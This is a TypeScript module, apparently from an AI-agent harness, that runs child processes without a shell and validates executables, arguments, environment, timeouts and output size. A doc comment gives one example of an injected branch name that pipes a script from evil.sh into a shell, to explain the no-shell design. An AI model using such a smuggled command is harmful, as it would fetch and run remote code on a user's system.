import { spawn } from "node:child_process";
import { extname, isAbsolute } from "node:path";

import { ProcessError } from "./errors.js";

/**
 * The one place the harness starts a child process.
 *
 * The rule this module exists to enforce: **a command is an executable plus an
 * argument vector, never a string.** No shell is involved at any point, so
 * there is nothing to interpret `;`, `&&`, backticks, `|`, or `%VAR%`. A model
 * that supplies `main; curl evil.sh | sh` as a branch name gets a branch named
 * `main; curl evil.sh | sh`, not four commands.
 *
 * That property is what lets `git` and `ripgrep` be treated as substrate rather
 * than as arbitrary execution — see ADR 0013.
 */

/** Two minutes. Long enough for a real `git clone`, short enough to notice. */
const DEFAULT_TIMEOUT_MS = 120_000;

/** 8 MiB. Beyond this the output is not being read by a human or a model. */
const DEFAULT_MAX_OUTPUT_BYTES = 8 * 1024 * 1024;

/**
 * Variables Windows binaries need in order to start at all.
 *
 * This is the single, deliberate exception to "the environment is built from
 * policy, never from `process.env`". Without `SystemRoot` many Windows
 * executables fail to initialise the socket and crypto layers; without a temp
 * directory git cannot write its index lock. The list is an allowlist of OS
 * plumbing, and nothing here can carry a credential — `PATH` in particular is
 * deliberately absent, because inheriting it is how a spawned binary finds
 * tools the caller never approved.
 */
const OS_REQUIRED_VARIABLES = ["SystemRoot", "windir", "TEMP", "TMP"] as const;

export interface ProcessResult {
  /** What the child concluded. Non-zero is a result, not a failure. */
  readonly exitCode: number;
  readonly stdout: string;
  readonly stderr: string;
}

export interface RunProcessOptions {
  /** Absolute path to a real executable, from the vendor resolver. */
  readonly executable: string;
  readonly args: readonly string[];
  readonly cwd: string;
  /** Built by the caller from policy. Never inherited. */
  readonly env?: Readonly<Record<string, string>>;
  readonly timeoutMs?: number;
  readonly maxOutputBytes?: number;
  readonly signal?: AbortSignal;
  readonly stdin?: string;
}

/**
 * Builds the child's environment.
 *
 * Exported so tests can assert the exception above stays an exception.
 */
export function buildEnvironment(
  supplied: Readonly<Record<string, string>> = {},
): Record<string, string> {
  const environment: Record<string, string> = {};

  for (const name of OS_REQUIRED_VARIABLES) {
    const value = process.env[name];
    if (value !== undefined) environment[name] = value;
  }

  // The caller's policy wins, so a policy that pins TEMP is honoured rather
  // than silently overwritten by the host's.
  return { ...environment, ...supplied };
}

/**
 * Rejects an argument vector before anything is spawned.
 *
 * Every check here is a case where the OS would otherwise reinterpret our
 * intent rather than fail loudly.
 */
function assertRunnable(options: RunProcessOptions): void {
  if (!isAbsolute(options.executable)) {
    // A bare name would be resolved through PATH by the OS, which puts the
    // choice of binary in the hands of whatever is on the machine.
    throw new ProcessError("invalid_argument", {
      message: "A command must be an absolute path to an executable.",
    });
  }

  if (process.platform === "win32") {
    const extension = extname(options.executable).toLowerCase();
    if (extension !== ".exe" && extension !== ".com") {
      // `.bat` and `.cmd` cannot be run without a shell, and running them
      // through `cmd.exe` reintroduces metacharacter parsing of our arguments
      // (CVE-2024-27980). Refusing is the only way to keep the no-shell
      // guarantee true on Windows.
      throw new ProcessError("invalid_argument", {
        message: "Only .exe programs can be run; batch files are not supported.",
      });
    }
  }

  for (const argument of options.args) {
    if (typeof argument !== "string") {
      throw new ProcessError("invalid_argument", {
        message: "Every command argument must be text.",
      });
    }
    if (argument.includes("\0")) {
      // A NUL truncates the argument at the OS boundary, so what runs is not
      // what was validated.
      throw new ProcessError("invalid_argument", {
        message: "A command argument may not contain a null character.",
      });
    }
  }
}

/**
 * Ends a process and everything it started.
 *
 * `child.kill()` signals only the process we spawned. Git in particular spawns
 * helpers, so killing just the parent on a timeout leaves those running and
 * holding the repository's index lock.
 */
function killTree(pid: number | undefined, kill: () => void): void {
  if (pid === undefined) {
    kill();
    return;
  }

  if (process.platform === "win32") {
    try {
      spawn("taskkill", ["/pid", String(pid), "/T", "/F"], {
        stdio: "ignore",
        windowsHide: true,
      }).unref();
      return;
    } catch {
      // Fall through: a failed taskkill is still better than no kill at all.
    }
  }

  kill();
}

export async function runProcess(options: RunProcessOptions): Promise<ProcessResult> {
  assertRunnable(options);

  const timeoutMs = options.timeoutMs ?? DEFAULT_TIMEOUT_MS;
  const maxOutputBytes = options.maxOutputBytes ?? DEFAULT_MAX_OUTPUT_BYTES;

  if (options.signal?.aborted) {
    throw new ProcessError("aborted");
  }

  return new Promise<ProcessResult>((resolve, reject) => {
    const child = spawn(options.executable, [...options.args], {
      cwd: options.cwd,
      env: buildEnvironment(options.env),
      // The whole design rests on this staying false.
      shell: false,
      windowsHide: true,
      stdio: ["pipe", "pipe", "pipe"],
    });

    const stdout: Buffer[] = [];
    const stderr: Buffer[] = [];
    let bytes = 0;
    let settled = false;
    /** Set once we have decided to kill; the close handler reports it. */
    let outcome: ProcessError | undefined;
    let graceTimer: NodeJS.Timeout | undefined;

    /** The first outcome wins; later ones are noise from the teardown. */
    const settle = (finish: () => void): void => {
      if (settled) return;
      settled = true;
      clearTimeout(timer);
      clearTimeout(graceTimer);
      options.signal?.removeEventListener("abort", onAbort);
      finish();
    };

    /**
     * Kills the process, then rejects once it is actually gone.
     *
     * Rejecting the moment the kill is *issued* would hand control back while
     * the child is still running and still holding its working directory open,
     * so a caller that cancels and then cleans up races a live process. The
     * grace timer is the escape hatch for a child that ignores the kill.
     */
    const stop = (error: ProcessError): void => {
      if (settled || outcome !== undefined) return;
      outcome = error;
      clearTimeout(timer);
      options.signal?.removeEventListener("abort", onAbort);
      killTree(child.pid, () => child.kill("SIGKILL"));
      graceTimer = setTimeout(() => settle(() => reject(error)), 2_000);
    };

    const timer = setTimeout(() => stop(new ProcessError("timeout")), timeoutMs);
    const onAbort = (): void => stop(new ProcessError("aborted"));
    options.signal?.addEventListener("abort", onAbort, { once: true });

    const collect = (into: Buffer[]) => (chunk: Buffer) => {
      bytes += chunk.byteLength;
      if (bytes > maxOutputBytes) {
        // Killed rather than truncated: a command this loud is malfunctioning,
        // and quietly returning its first 8 MiB as if complete would let a
        // caller reason about a partial answer without knowing it is partial.
        stop(new ProcessError("output_limit"));
        return;
      }
      into.push(chunk);
    };

    child.stdout.on("data", collect(stdout));
    child.stderr.on("data", collect(stderr));

    child.on("error", (cause) => {
      settle(() => reject(new ProcessError("spawn_failed", { cause })));
    });

    child.on("close", (code) => {
      const killed = outcome;
      if (killed !== undefined) {
        settle(() => reject(killed));
        return;
      }

      settle(() => {
        resolve({
          // A process killed by a signal reports a null code. Reporting that as
          // 0 would read as success.
          exitCode: code ?? 1,
          stdout: Buffer.concat(stdout).toString("utf8"),
          stderr: Buffer.concat(stderr).toString("utf8"),
        });
      });
    });

    if (options.stdin !== undefined) {
      child.stdin.end(options.stdin);
    } else {
      // Left open, a child that reads stdin waits forever and only the timeout
      // ends it.
      child.stdin.end();
    }
  });
}
